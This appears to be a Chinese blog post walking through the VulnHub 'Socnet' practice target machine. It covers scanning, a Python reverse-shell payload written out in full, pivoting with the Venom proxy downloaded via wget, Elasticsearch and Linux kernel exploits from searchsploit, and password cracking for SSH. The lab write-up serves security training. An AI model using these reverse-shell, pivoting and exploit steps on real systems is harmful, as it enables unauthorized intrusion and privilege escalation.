@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【打靶】Socnet | 西风的那一年</title><meta name="author" content="ZEPHeyrr"><meta name="copyright" content="ZEPHeyrr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶机下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;medium_socnet.ova 主机探测arp-scan -l  nmap -sn 192.168.40.0&#x2F;16  kali：192.168.40.148 靶机：192.168.40.149 开始时没能使用工具扫描到靶机ip，最后才发现是因为VMware默认采用了桥接模式而非ＮＡＴ模式将其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【打靶】Socnet">
+<meta property="og:url" content="http://120.46.180.209/2023/07/24/Socnet/index.html">
+<meta property="og:site_name" content="西风的那一年">
+<meta property="og:description" content="靶机下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;medium_socnet.ova 主机探测arp-scan -l  nmap -sn 192.168.40.0&#x2F;16  kali：192.168.40.148 靶机：192.168.40.149 开始时没能使用工具扫描到靶机ip，最后才发现是因为VMware默认采用了桥接模式而非ＮＡＴ模式将其">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://120.46.180.209/2023/07/24/Socnet/cover.PNG">
+<meta property="article:published_time" content="2023-07-24T00:07:48.000Z">
+<meta property="article:modified_time" content="2023-07-27T10:38:22.000Z">
+<meta property="article:author" content="ZEPHeyrr">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://120.46.180.209/2023/07/24/Socnet/cover.PNG"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "【打靶】Socnet",
+  "url": "http://120.46.180.209/2023/07/24/Socnet/",
+  "image": "http://120.46.180.209/2023/07/24/Socnet/cover.PNG",
+  "datePublished": "2023-07-24T00:07:48.000Z",
+  "dateModified": "2023-07-27T10:38:22.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZEPHeyrr",
+      "url": "http://120.46.180.209/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://120.46.180.209/2023/07/24/Socnet/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【打靶】Socnet',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa fa-envelope-open"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(2023/07/24/Socnet/cover.PNG);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">西风的那一年</span></a><a class="nav-page-title" href="/"><span class="site-name">【打靶】Socnet</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa fa-envelope-open"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【打靶】Socnet</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-24T00:07:48.000Z" title="发表于 2023-07-24 08:07:48">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-27T10:38:22.000Z" title="更新于 2023-07-27 18:38:22">2023-07-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%8D%9A%E6%96%87/">博文</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>靶机下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/medium_socnet.ova">https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</a></p>
+<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><p><code>arp-scan -l</code></p>
+<p><img src="/2023/07/24/Socnet/arpscan.PNG" alt="arp-scan命令使用参数-l"></p>
+<p><code>nmap -sn 192.168.40.0/16</code></p>
+<p><img src="/2023/07/24/Socnet/nmapsc.PNG" alt="nmap主机探测命令使用参数"></p>
+<p>kali：192.168.40.148</p>
+<p>靶机：192.168.40.149</p>
+<p>开始时没能使用工具扫描到靶机ip，最后才发现是因为VMware默认采用了桥接模式而非ＮＡＴ模式将其接入网络。</p>
+<h1 id="进一步信息收集"><a href="#进一步信息收集" class="headerlink" title="进一步信息收集"></a>进一步信息收集</h1><h2 id="1-端口、服务、操作系统探测"><a href="#1-端口、服务、操作系统探测" class="headerlink" title="1.端口、服务、操作系统探测"></a>1.端口、服务、操作系统探测</h2><p><code>nmap -sV -sC -O 192.168.40.149</code></p>
+<p><img src="/2023/07/24/Socnet/scanforports.PNG" alt="进一步搜集信息"></p>
+<p>目标开放了22、5000端口，在5000端口运行了一个由python2编写的http服务“Werkzeug”。在按照提示输入少于4字符长度的信息时会提示输入不够长</p>
+<p><img src="/2023/07/24/Socnet/serv.PNG" alt="进一步搜集信息"></p>
+<h2 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h2><p><code>dirsearch -u 192.168.40.149：5000</code></p>
+<p>对5000端口进行目录扫描，发现一个／admin目录，访问，内有一个可执行python代码的入口。</p>
+<h1 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h1><h2 id="1-利用python来反弹shell"><a href="#1-利用python来反弹shell" class="headerlink" title="1.利用python来反弹shell"></a>1.利用python来反弹shell</h2><p>先在kali监听5555端口：</p>
+<p><code>nc -lvnp 5555</code></p>
+<p>在网页执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">Rhost=<span class="string">&#x27;192.168.40.149&#x27;</span>;<span class="comment">#kali</span></span><br><span class="line">Rport=<span class="number">5555</span>;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<span class="comment"># 创建一个TCP-socket对象</span></span><br><span class="line">s.connect((Rhost,Rport));    <span class="comment"># 连接攻击者</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);       <span class="comment"># 复制链接符</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);<span class="comment"># 创建子进程调用SHELL </span></span><br></pre></td></tr></table></figure>
+
+<p>然后在kali端反弹shell，虽有root权限，但在目录下含有docker文档，且ip并非靶机ip。因此本用户可能只是docker容器的。</p>
+<p><img src="/2023/07/24/Socnet/done1.PNG" alt="需要排除蜜罐的可能"></p>
+<h2 id="2-内网探测"><a href="#2-内网探测" class="headerlink" title="2.内网探测"></a>2.内网探测</h2><p>然后进行内网探测，此内网有16位掩码，使用循环探测。</p>
+<p><code>for i in $(seq 1 100); do ping -c 1 172.17.0.$i; done</code></p>
+<p><img src="/2023/07/24/Socnet/neiwangtance.PNG" alt="内网"></p>
+<p>本机为.2，除此之外还有.1和.3两台主机。</p>
+<p>容器里没有可利用的工具，所以使用<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1x24y1o7WC/?vd_source=1e582f5d2476807f6025593d012c9f1a">venom</a>进行代理，以便使用kali访问靶机内网。</p>
+<p>用venom监听8888端口，kali为64位</p>
+<p><img src="/2023/07/24/Socnet/venom.PNG" alt="监听"></p>
+<p>然后在kali端启动一个临时的http服务，以便靶机可以下载代理客户端。</p>
+<p><code>python -m http.server 80</code>注意，根目录即为此命令运行时的目录</p>
+<p><img src="/2023/07/24/Socnet/httpserv.PNG" alt="http服务"></p>
+<p>在靶机的shell下载文件，给它运行的权限。</p>
+<p>wget 192.168.40.148&#x2F;agent_linux_x64</p>
+<p>chmod +x agent_linux_x64 </p>
+<p><img src="/2023/07/24/Socnet/quanxian.PNG"></p>
+<p><img src="/2023/07/24/Socnet/lianjie.PNG" alt="成功连接"></p>
+<p><img src="/2023/07/24/Socnet/lianjie2.PNG" alt="成功连接(kali端)"></p>
+<p>使用show命令查找结点，再用goto连接该结点，并启动socks监听</p>
+<p><img src="/2023/07/24/Socnet/socks.PNG" alt="成功连接(kali端)"></p>
+<p>使用proxychain工具设置代理访问靶机的内网。</p>
+<p>修改proxychains4.conf文件，其中SOCKS5同时支持tcp和udp应用。</p>
+<p><img src="/2023/07/24/Socnet/moderateprox.PNG" alt="修改配置"></p>
+<p>探测.1的那台主机，发现开启服务与端口同最开始时靶机的情况。</p>
+<p><code>proxychains nmap -Pn -sT -sV 172.17.0.1</code></p>
+<p><img src="/2023/07/24/Socnet/dot1.PNG" alt="点1的探测结果"></p>
+<p>探测.3主机，开启了9200端口，是一个Elasticsearch服务。</p>
+<p><code>proxychains nmap -Pn -sT -sV 172.17.0.3</code></p>
+<p><img src="/2023/07/24/Socnet/dot2.PNG" alt="点3的探测结果"></p>
+<p>至此，我们通过访问内网发现了第二台主机（就是点3的那台）可能有漏洞利用的可能。</p>
+<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><p>搜索漏洞，并把第一个结果复制到当前目录</p>
+<p><code>searchsploit Elasticsearch</code></p>
+<p><code>searchsploit -m 36337.py ./</code></p>
+<p><img src="/2023/07/24/Socnet/els.PNG" alt="尝试利用"></p>
+<p>大概看看代码，然后拿到另一台主机的shell</p>
+<p><code>proxychains python2 36337.py 172.17.0.3</code></p>
+<p><img src="/2023/07/24/Socnet/problem.PNG" alt="出了点问题"></p>
+<p>然后就出错了，下次在解决吧，开摆。</p>
+<p>———————————————————更新分界线—————————————————————-</p>
+<p>根据查询资料，这个elasticsearch为一个分布式搜索和分析引擎。</p>
+<p>而以上问题的原因，是因为初次使用系统内没有数据，需要手动添加一条数据：</p>
+<p><code>proxychains curl -XPOST &#39;http://172.17.0.3:9200/twitter/user/yren&#39; -d &#39;&#123;&quot;name&quot;:&quot;Ww&quot;&#125;&#39;</code></p>
+<p><img src="/2023/07/24/Socnet/problem_solved.PNG"></p>
+<p>成功拿到另一台主机的shell，并发现目录下有个敏感文件passwords</p>
+<p><img src="/2023/07/24/Socnet/sense.PNG"></p>
+<p>在somd5.com进行查找，尝试使用John-1337hack登录ssh，成功。</p>
+<p><img src="/2023/07/24/Socnet/john.PNG"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用的是内核提权，因为内核版本低(Linux 3.13.0)。</p>
+<p><img src="/2023/07/24/Socnet/core.PNG"></p>
+<p>搜索可用脚本，复制……</p>
+<p><code>searchsploit Linux 3.13.0</code></p>
+<p><img src="/2023/07/24/Socnet/coresploit.PNG"></p>
+<p>新问题是，该脚本需要使用gcc编译，但靶机中没用gcc。所以c代码需要在kali端编译。</p>
+<p>在源代码中，需要将一个c文件编译为so文件，再调用这个so文件。所以需要去除这段内容，再把现成的so文件送给靶机调用。</p>
+<p><img src="/2023/07/24/Socnet/prob2.PNG"></p>
+<p><code>gcc 37292.c -o exp</code></p>
+<p>编译c文件，命名为exp，并准备好ofs-lib.so文件，使用python的http服务将其送给靶机（和之前送代理客户端一样）</p>
+<p><img src="/2023/07/24/Socnet/save.PNG"></p>
+<p>将文件放在&#x2F;tmp下（据说是为了方便？）</p>
+<p>给权限，执行。</p>
+<p><code>chmod +x exp</code></p>
+<p><img src="/prob.PNG"></p>
+<p>又出错了，这是因为kali上编译时的动态库高于靶机。重新下载版本适合的动态库 libc6_2.19-0ubuntu6_amd64.deb</p>
+<p>解压，重新使用该库编译c文件</p>
+<p>gcc 37292.c -o  exp -Ldir libc.so.6</p>
+<p>再重复上述操作提权。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://120.46.180.209">ZEPHeyrr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://120.46.180.209/2023/07/24/Socnet/">http://120.46.180.209/2023/07/24/Socnet/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://120.46.180.209" target="_blank">西风的那一年</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post-share"><div class="social-share" data-image="/2023/07/24/Socnet/cover.PNG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/06/24/Cross-Modal/" title="【论文阅读】基于跨模型交互网络的视频片段检索"><img class="cover" src="/2023/06/24/Cross-Modal/202306151521.PNG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【论文阅读】基于跨模型交互网络的视频片段检索</div></div><div class="info-2"><div class="info-item-1">文章信息：Zhang Z , Lin Z , Zhao Z ,et al.Cross-Modal Interaction Networks for Query-Based Moment Retrieval in Videos[J].ACM, 2019.DOI:10.1145&#x2F;3331184.3331235. 源码： https://github.com/ikuinen/CMIN 引言部分对标题【跨模型】的解释要从一个连续的复杂的视频中定位出一小段特定的片段要比从已定义的集和中找出一个视频要困难的多。在下图所示的例子中,一个句子包含了两个连续的动作，对应了视频中的两段内容。因此正确的视频内容检索需要理解视频以及查询内容，二者缺一不可。这点就需要跨模形（cross-modal）的支持。  本文对高质量视频检索的考虑首先查询内容通常包含了因果时间上的行为，因此学习细粒度查询表示就很重要。目前的方法使用循环神经网络（如GRU）来理解查询语句语义，但它们通常无法顾及句法结构。 本文所采用的是图卷积网络（GCN，Graph convolution...</div></div></div></a><a class="pagination-related" href="/2023/07/28/mXML/" title="【论文阅读】mTVL:支持多语言的视频片段检索"><img class="cover" src="/2023/07/28/mXML/1024.PNG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">【论文阅读】mTVL:支持多语言的视频片段检索</div></div><div class="info-2"><div class="info-item-1">论文原标题: Lei J , Berg T L , Bansal M .MTVR: Multilingual Moment Retrieval in Videos[J]. 2021.DOI:10.48550&#x2F;arXiv.2108.00061. 源码：https://github.com/jayleicn/mTVRetrieval 摘要及引言：采用数据集MTVR：一种在TVR数据集的基础上增加了相应的中文查询和标题，包含了对21.8K条视频的218K条英语和中文的查询，是最大的视频检索数据集，且支持对话检索（以字幕的形式）。 提出了mXML：一个支持双语言的多片段检索模型，它通过参数共享和限制语言邻域在数据集上执行操作和训练。在XML（by Lei，2020）的基础上加入了参数共享（by Sachan and Neubig，2018；Dong，2015）使得两个语言可以用统一的解码器解码。引入语言邻域限制（by...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2023/08/02/admx-new/" title="【打靶】AdmX_new"><img class="cover" src="/2023/08/02/admx-new/cover1.PNG" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="info-item-2">【打靶】AdmX_new</div></div><div class="info-2"><div class="info-item-1">靶机地址：https://download.vulnhub.com/admx/AdmX_new.7z 信息搜集及主机发现主机发现nmap -sn 192.168.40.0/24 netdiscover -r 192.168.40.0/24 这里再记录一工具arping，相较于arp-scan它范围更广，配合简单的bash使用。 for i in $(seq 1 256);do sudo arping -c 1 192.168.40.$i;done  kali:192.168.40.148 靶机：192.168.40.150 信息搜集靶机端口、服务、操作系统探测nmap -sV -p- -O 192.168.40.150 主机只开放了80端口，访问后为apache的默认配置界面。   目录爆破dirsearch -u 192.168.40.150:80 80端口下存在&#x2F;wordpress...</div></div></div></a><a class="pagination-related" href="/2025/06/03/ctf-blackbox/" title="【CTFSHOW】 web入门-黑盒测试"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-03</div><div class="info-item-2">【CTFSHOW】 web入门-黑盒测试</div></div><div class="info-2"><div class="info-item-1">web380 扫描目录后，存在page.php 这里存在一个id.php参数，可能是文件包含。get传入id&#x3D;flag即可 web381 原来的page.php加入了一个包含文件的前缀。  在注释中存在一个不存在于常见目录名称的目录，访问之即可 web382访问上题的目录，发现一个登录界面。  简单注入即可 web383同382...</div></div></div></a><a class="pagination-related" href="/2024/07/22/ctf-file-upload/" title="【CTFSHOW】 web入门文件上传"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-22</div><div class="info-item-2">【CTFSHOW】 web入门文件上传</div></div><div class="info-2"><div class="info-item-1">web151前端验证文件格式，抓包改包。  web152说是后端提供了校验，但是抓包改包也可。 web153.user.ini实际上就是一个可以由用户“自定义”的php.ini 在其中添加如下选项可以包含一些文件： 1auto_prepend_file=01.png  若该目录下存在合法的php文档则会自动包含这个gif文件。恰好，本地是黑名单过滤。 首先通过前两题同样的方法将.user.ini文件上传，再直接上传改了后缀名的🐎。 web154黑名单过滤了上传文件中不能有php，但是大小写可以绕过，其他同上。 web155黑名单过滤，不区分大小写，但是可以用短标签   web156在之前的基础上过滤了中括号[] 用大括号代替之。 web157 158过滤了{} []&#x3D; 直接写命令 123&lt;?     system(&quot;nl ../fl*&quot;)?&gt;                  web159过滤了system...</div></div></div></a><a class="pagination-related" href="/2024/11/11/ctfshow-codeaudit/" title="【CTFSHOW】 web入门-代码审计"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="info-item-2">【CTFSHOW】 web入门-代码审计</div></div><div class="info-2"><div class="info-item-1">web301系统是一个登录界面  源码中登陆界面中，用户名似乎存在注入点。  if(!strcasecmp($userpwd,$row[&#39;sds_password&#39;]))&#123; 这一行是密码与查询到结果相等即可。所以可以联合注入控制密码的值。 username:-1’ union select 1234# password:1234 web302修改了以上检查登录的那句 1if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;  在fun.php提供了这个哈希函数  那就调用该方法： 1echo sds_decode(&quot;1234&quot;)#3cd76fc2201d6959a8c1c63dbd906ec7  username:-1’ union select...</div></div></div></a><a class="pagination-related" href="/2024/06/11/ctfshow-gets/" title="【CTFSHOW】 web入门-其他"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-11</div><div class="info-item-2">【CTFSHOW】 web入门-其他</div></div><div class="info-2"><div class="info-item-1">仅作记录，从这里开始是因为这些题传get参数就行 12345678910111213141516&lt;?php$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;结果----------------------------------------------------------------------------------------------------Array([scheme] =&gt; http[host] =&gt; hostname[user] =&gt; username[pass] =&gt; password[path] =&gt; /path[query] =&gt; arg=value[fragment] =&gt;...</div></div></div></a><a class="pagination-related" href="/2025/10/10/ctfshow-appsafe/" title="【CTFSHOW】 web应用安全与防护"><img class="cover" src="/img/ctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-10</div><div class="info-item-2">【CTFSHOW】 web应用安全与防护</div></div><div class="info-2"><div class="info-item-1">第一章Base64编码隐藏前端js代码中有登录逻辑，解码这个base64## HTTP头注入在使用前文获取的口令登录后显示：所以更改User-Agent字段为指定的内容## Base64多层嵌套解码12345678910document.getElementById(&#x27;loginForm&#x27;).addEventListener(&#x27;submit&#x27;, function(e) &#123;            const correctPassword = &quot;SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=&quot;;                        function validatePassword(input) &#123;                let encoded = btoa(input);                encoded = btoa(encoded + &#x27;xH7jK&#x27;).slice(3);         ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZEPHeyrr</div><div class="author-info-description">我想事情是它本来该有的样子</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zepheyrr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我觉得我是一个人，我希望通往山下的路断成天堑。我所在的地方成了孤峰，我一个人在孤峰上老死。可人总高估自己.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">进一步信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E3%80%81%E6%9C%8D%E5%8A%A1%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.端口、服务、操作系统探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">2.目录扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">尝试利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 